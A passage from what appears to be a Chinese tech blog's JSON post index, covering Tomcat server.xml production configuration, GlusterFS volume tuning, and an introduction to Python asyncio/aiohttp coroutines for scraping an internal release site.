中被定义。下面的例子就是在 Engine 中做了拦截，定义了日志格式，交给下一个日志处理组件做处理。\n缺省配置\n\u0026lt;Valve className=\u0026#34;org.apache.catalina.valves.AccessLogValve\u0026#34; directory=\u0026#34;logs\u0026#34; prefix=\u0026#34;localhost_access_log.\u0026#34; suffix=\u0026#34;.txt\u0026#34; pattern=\u0026#34;%h %l %u %t \u0026amp;quot;%r\u0026amp;quot; %s %b\u0026#34; /\u0026gt; 我们的配置修改了缺省的日志格式，多了很多明细的内容，改变了分割符：\n\u0026lt;Valve className=\u0026#34;org.apache.catalina.valves.AccessLogValve\u0026#34; directory=\u0026#34;logs\u0026#34; prefix=\u0026#34;access_log.\u0026#34; suffix=\u0026#34;.txt\u0026#34; fileDateFormat=\u0026#34;yyyy-MM-dd\u0026#34; pattern=\u0026#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i \u0026#34; resolveHosts=\u0026#34;false\u0026#34;/\u0026gt; Context Context定义了具体的访问路径，一定要指定 docBase ！！！大家一定要记住 appBase 和 docBase 不同为空！！！\n\u0026lt;Context path=\u0026#34;\u0026#34; docBase=\u0026#34;/export/servers/tomcat/webapps/web\u0026#34; /\u0026gt; 如上，我们就配好了一个生产环境的 server.xml ，注意，这个 xml 文件是可以放在解开的tomcat压缩包 apache-tomcat-8.5.64 目录之外的。\n我们再另外编写一个启动文件 start.sh：\n#!/bin/sh export JAVA_OPTS=\u0026#34;-server -Xms1024m -Xmx2048m -Djava.awt.headless=true -Dsun.net.client.defaultConnectTimeout=60000 -Dsun.net.client.defaultReadTimeout=60000 -Djmagick.systemclassloader=no -Dnetworkaddress.cache.ttl=300 -Dsun.net.inetaddr.ttl=300\u0026#34; export CATALINA_HOME=/export/servers/tomcat/apache-tomcat-8.5.64 cd /export/servers/tomcat/ $CATALINA_HOME/bin/catalina.sh start -config \u0026#34;/export/servers/tomcat/server.xml\u0026#34; 这样，我们的启动文件和配置文件，就和 tomcat 目录分离了，这样做的好处是如果 tomcat 需要升级，那么直接解压换目录即可。\n我们可以做个软链接 tomcat 链接到 apache-tomcat-8.5.64，这样更方便操作。\n","permalink":"https://rendoumi.com/posts/20211115-tomcat_config/","summary":"\u003cp\u003eTomcat 是一个 HTTP server。同时，它也是一个 serverlet 容器，可以执行 java 的 Servlet，也可以把 JavaServer Pages（JSP）和 JavaServerFaces（JSF）编译成 Java Servlet。它的模型图如下：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211115193643613\" loading=\"lazy\" src=\"/posts/20211115-tomcat_config/image-20211115193643613.png\"\u003e\u003c/p\u003e\n\u003cp\u003e给个生产环境 server.xml 的例子：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv class=\"chroma\"\u003e\n\u003ctable class=\"lntable\"\u003e\u003ctr\u003e\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode\u003e\u003cspan class=\"lnt\"\u003e 1\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e 2\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e 3\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e 4\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e 5\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e 6\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e 7\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e 8\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e 9\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e10\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e11\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e12\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e13\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e14\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e15\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e16\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e17\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e18\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e19\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e20\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e21\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e22\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e23\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e24\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e25\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e26\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e27\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e28\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e29\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e30\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e31\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e32\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e33\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e34\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e35\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e36\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e37\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e38\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e39\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e40\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e41\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e42\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e43\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e44\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e45\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e46\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e47\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e48\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e\u0026lt;?xml version\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;1.0\u0026#39; encoding=\u0026#39;utf-8\u0026#39;?\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e\u0026lt;Server port\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;-1\u0026#34; shutdown=\u0026#34;SHUTDOWN\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026lt;Listener className=\u0026#34;org.apache.catalina.startup.VersionLoggerListener\u0026#34; /\u0026gt; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026lt;Listener className=\u0026#34;org.apache.catalina.core.AprLifecycleListener\u0026#34; SSLEngine=\u0026#34;on\u0026#34; /\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026lt;Listener className=\u0026#34;org.apache.catalina.core.JreMemoryLeakPreventionListener\u0026#34; /\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026lt;Listener className=\u0026#34;org.apache.catalina.mbeans.GlobalResourcesLifecycleListener\u0026#34; /\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026lt;Listener className=\u0026#34;org.apache.catalina.core.ThreadLocalLeakPreventionListener\u0026#34; /\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003e\u0026lt;GlobalNamingResources\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026lt;Resource name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;UserDatabase\u0026#34; auth=\u0026#34;Container\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e              type=\u0026#34;org.apache.catalina.UserDatabase\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e              description=\u0026#34;User database that can be updated and saved\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e              factory=\u0026#34;org.apache.catalina.users.MemoryUserDatabaseFactory\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e              pathname=\u0026#34;conf/tomcat-users.xml\u0026#34; /\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026lt;/GlobalNamingResources\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003e\u0026lt;Service name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Catalina\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    \u0026lt;Connector port=\u0026#34;8080\u0026#34; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               server=\u0026#34;www.rendoumi.com\u0026#34; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               protocol=\u0026#34;org.apache.coyote.http11.Http11NioProtocol\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               maxHttpHeaderSize=\u0026#34;8192\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               acceptCount=\u0026#34;500\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               maxThreads=\u0026#34;1000\u0026#34; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               minSpareThreads=\u0026#34;200\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               enableLookups=\u0026#34;false\u0026#34; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               redirectPort=\u0026#34;8443\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               connectionTimeout=\u0026#34;20000\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               relaxedQueryChars=\u0026#34;[]|{}@!$*()+\u0026#39;.,;^\\`\u0026amp;quot;\u0026amp;lt;\u0026amp;gt;\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               disableUploadTimeout=\u0026#34;true\u0026#34; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               allowTrace=\u0026#34;false\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               URIEncoding=\u0026#34;UTF-8\u0026#34; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               useBodyEncodingForURI=\u0026#34;true\u0026#34; /\u0026gt;  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026lt;Engine name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Catalina\u0026#34; defaultHost=\u0026#34;localhost\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      \u0026lt;Realm className=\u0026#34;org.apache.catalina.realm.LockOutRealm\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        \u0026lt;Realm className=\u0026#34;org.apache.catalina.realm.UserDatabaseRealm\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               resourceName=\u0026#34;UserDatabase\u0026#34;/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      \u0026lt;/Realm\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      \u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;webapps\u0026#34; unpackWARs=\u0026#34;false\u0026#34; autoDeploy=\u0026#34;false\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          \u0026lt;Valve className=\u0026#34;org.apache.catalina.valves.AccessLogValve\u0026#34; directory=\u0026#34;logs\u0026#34; prefix=\u0026#34;access_log.\u0026#34; suffix=\u0026#34;.txt\u0026#34;  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e                fileDateFormat=\u0026#34;yyyy-MM-dd\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e                pattern=\u0026#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i \u0026#34; resolveHosts=\u0026#34;false\u0026#34;/\u0026gt; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          \u0026lt;Context path=\u0026#34;\u0026#34; docBase=\u0026#34;/export/servers/tomcat/webapps/web\u0026#34; /\u0026gt; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      \u0026lt;/Host\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026lt;/Engine\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003e\u0026lt;/Service\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e\u0026lt;/Server\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003e分解开来一部分一部分的看：\u003c/p\u003e","title":"Tomcat server.xml配置详细解释"},{"content":"公司用了6年的GlusterFS终于到了要调整卷参数的地步了。\n小文件已经多到要影响 IO 的地步了。\n首先说一下结论，GlusterFS 安装完成后，基本不需要调整任何参数。生产系统千万不可盲目！\n然后我们这是有特殊情况，所以调优步骤如下（以卷名为 esign-vol 为例）：\n#必须关掉NFS gluster volume set esign-vol nfs.disable on #必须保留10%的空间，避免塞爆卷空间 gluster volume set esign-vol cluster.min-free-disk 10% #本机有256G的内存，所以设置25G的读缓存 gluster volume set esign-vol performance.cache-size 25GB #读缓存中，单个文件的缓存，最大文件size是128MB，大于128MB的单个文件不缓存 gluster volume set esign-vol performance.cache-max-file-size 128MB #设置每个客户端都允许多线程，缺省是2，多个小文件增加为4 gluster volume set esign-vol client.event-threads 4 #设置服务器端对特定的卷允许多线程，缺省是1,多个小文件增加为4 gluster volume set esign-vol server.event-threads 4 #分割线，以下参数不要调整，除非明确知道后果 #设置 io 线程数量，这个值缺省是16，已经很大了，足够用 gluster volume set esign-vol performance.io-thread-count 16 #设置写缓冲区，这个值缺省是1M，弄大了如果停电什么的，会丢数据 gluster volume set esign-vol performance.write-behind-window-size: 1M 以上就可以了。还有个参数 global-threading ，缺省是 off，不要设置为 on，有使用条件的，弄错了反而会导致性能降低。\n","permalink":"https://rendoumi.com/posts/20211115-gluster_tuning/","summary":"\u003cp\u003e公司用了6年的GlusterFS终于到了要调整卷参数的地步了。\u003c/p\u003e\n\u003cp\u003e小文件已经多到要影响 IO 的地步了。\u003c/p\u003e\n\u003cp\u003e首先说一下结论，GlusterFS 安装完成后，基本不需要调整任何参数。生产系统千万不可盲目！\u003c/p\u003e\n\u003cp\u003e然后我们这是有特殊情况，所以调优步骤如下（以卷名为 esign-vol 为例）：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#必须关掉NFS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e esign-vol nfs.disable on\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#必须保留10%的空间，避免塞爆卷空间\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e esign-vol cluster.min-free-disk 10%\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#本机有256G的内存，所以设置25G的读缓存\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e esign-vol performance.cache-size 25GB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#读缓存中，单个文件的缓存，最大文件size是128MB，大于128MB的单个文件不缓存\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e esign-vol performance.cache-max-file-size 128MB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#设置每个客户端都允许多线程，缺省是2，多个小文件增加为4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e esign-vol client.event-threads \u003cspan class=\"m\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#设置服务器端对特定的卷允许多线程，缺省是1,多个小文件增加为4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e esign-vol server.event-threads \u003cspan class=\"m\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#分割线，以下参数不要调整，除非明确知道后果\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#设置 io 线程数量，这个值缺省是16，已经很大了，足够用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e esign-vol performance.io-thread-count \u003cspan class=\"m\"\u003e16\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#设置写缓冲区，这个值缺省是1M，弄大了如果停电什么的，会丢数据\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e esign-vol performance.write-behind-window-size: 1M  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e以上就可以了。还有个参数 global-threading ，缺省是 off，不要设置为 on，有使用条件的，弄错了反而会导致性能降低。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211115113321750\" loading=\"lazy\" src=\"/posts/20211115-gluster_tuning/image-20211115113321750.png\"\u003e\u003c/p\u003e","title":"GlusterFS文件系统的优化"},{"content":"在实际中遇到这样一个问题，公司软件发布上线自动化。\n说简单点，就是需要去登录一个上线的内部网站，然后爬下所有的上线数据。\n然后根据爬下来的数据整理好，可以一起上线的，就并发多线程，其实就是去传参数点击一个链接等返回。\n不能并发的就单线程点链接。\n那这个事情必须更有效率，单线程的没问题，用 python 的 request 就可以实现了。\n我们仔细研究一下协程，先讲一下历史：\n使用Python的人往往纠结在多线程、多进程，哪个效率更高？到底用哪个好呢？\n其实 Python 的多进程和多线程，相对于别家的协程和异步处理机制，都不行，线程之间切换耗费 CPU 和寄存器，OS 的调度不可控，多进程之间通讯也不便。性能根本不行。\n后来呢 Python 改进了语法，出现了 yiled from 充当协程调度，有人就根据这个特性开发了第三方的协程框架，Tornado，Gevent等。\n官方也不能坐视不理啊，任凭别人出风头，于是 Python 之父深入简出3年，苦心钻研自家的协程，async/await 和 asyncio 库，并放到 Python3.5 后成为官方原生的协程。\n对于 http请求、读写文件、读写数据库这种高延时的 IO 操作，协程是个大杀器，优点非常多；它可以在预料到一个阻塞将发生时，挂起当前协程，跑去执行其它协程，同时把事件注册到循环中，实现了多协程并发，其实这玩意是跟 Nodejs 的回调学的。\n看下图，详细解释下，左边我们有100个网页请求，并发100个协程请求（其实也是1个1个发），当需要等待长时间回应回应时，挂起当前协程，并注册一个回调函数到事件循环（Event Loop）中，执行下一个协程，当有协程事件完成再通过回调函数唤醒挂起的协程，然后返回结果。\n这个跟 nodejs 的回调函数基本一样，我们必须注意主进程和协程的关系，如果我在一个主进程中，触发协程函数，有100个协程，那么必须等待100个协程都结束后，才能回到正常的那个主进程中。当然，主进程也可能也是一个协程。\n那么协程的基本用法\nasync f(n) 声明一个函数是协程的\nawait f(n) 挂起当前协程，把控制权交回 event loop，并且执行f(n)和注册之后的f(n)回调。\n举个例子：如果在 g() 这个函数中执行了 await f()，那么g()函数会被挂起，并等待 f() 函数有结果结束，然后返回 g() 继续执行。\nasync def get(url): async with aiohttp.ClientSession() as session: async with session.get(url) as response: return await response.text() 最后一行 await 是挂起命令，挂起当前函数 get() ，并执行 response.text() 和注册回调，等待 response.text() 执行完成后重新激活当前函數get()继续执行，返回。\n所以 await 只叫做挂起是不太对的，感觉应该叫做 挂起并注册回调 比较合适。\n看以下程序，在 Python 3.7 之前，协程是这么用的：\nimport time import asyncio now = lambda : time.time() async def do_some_work(x): print(\u0026#39;Waiting: \u0026#39;, x) start = now() coroutine = do_some_work(2) loop = asyncio.get_event_loop() loop.run_until_complete(coroutine) print(\u0026#39;TIME: \u0026#39;, now() - start) 我们指定了一个协程 coroutine ，然后定义了一个事件循环 loop，loop 是需要 run_until_complete 所有的协程，然后交出控制权，返回正常的主进程。\n跟上图完全匹配。\n在 Python 3.7 之后，简化了用法，一句 asyncio.run 就可以了：\nasyncio.run(do_some_work(2)) 上面程序就变了，省了好多，但是副作用是第一次看到的人会不明白它是怎么进化过来的：\nimport time import asyncio now = lambda : time.time() async def do_some_work(x): print(\u0026#39;Waiting: \u0026#39;, x) start = now() asyncio.run(do_some_work(2)) print(\u0026#39;TIME: \u0026#39;, now() - start) 如果我们要访问一个网站的100个网页，单线程的做法是：请求一次，回来一次，然后进行下一个\nfor url in urls： response=get(url) results=parse(response) 这样效率很低，协程呢，做法就不同了，一次发起100个请求（准确的说也是一个一个发），不同的是协程不会死等返回，而是发一个请求，挂起，再发一个再挂起，发起100个，就挂起100个，然后注册并等待100个返回，效率提升了100倍。可以理解为同时做了100件事，做到由自己调度而不是交给CPU，程序的并发由自己来控制，而不是交由 OS 去调度，效率极大的提高了。\n进化到协程，我们把费 IO 的 get 函数抽出来放到协程里：\nasync def get(url:str): my_conn = aiohttp.TCPConnector(limit=10) async with aiohttp.ClientSession(connector=my_conn) as session: async with session.get(url) as resp: return await resp.text() for url in urls： response=asyncio.run(get(url)) results=parse(response) 具体到我们的项目，我们首先要登录一个网页拿到 cookie，这个过程其实就一个协程，没人会登录个几百次吧。然后把放了 cookie 的 session 取出来，供后面的协程再复用就可以了，示例代码如下：\nimport aiohttp import asyncio async def login(): my_conn = aiohttp.TCPConnector(limit=10) async with aiohttp.ClientSession(connector=my_conn) as session: data = {\u0026#39;loginname\u0026#39;:\u0026#39;wangbadan\u0026#39;,\u0026#39;password\u0026#39;:\u0026#39;Fuckyouall\u0026#39;} async with session.post(\u0026#39;http://192.168.1.3/user/login\u0026#39;,data=data) as resp: print(resp.url) 